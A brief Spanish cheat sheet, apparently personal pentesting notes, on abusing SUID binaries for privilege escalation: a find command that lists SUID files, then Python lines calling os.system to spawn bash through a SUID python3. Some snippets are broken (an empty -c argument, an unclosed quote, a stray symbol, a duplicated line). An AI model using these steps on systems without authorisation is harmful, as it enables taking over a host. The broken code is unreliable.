-- Los archivos con SUID pueden lelgar a ser crítico
```
find -perm -4000 -ls 2>/dev/null
```
si tenemos un archivo que nos permita ejecutar una consola, como por ejemplo python3
```
python3 -c ''
```
o si es python3.9
```○
python3.9
```

```
import os 
os.system("whoami)
os.system("bash")
os.system("bash")
```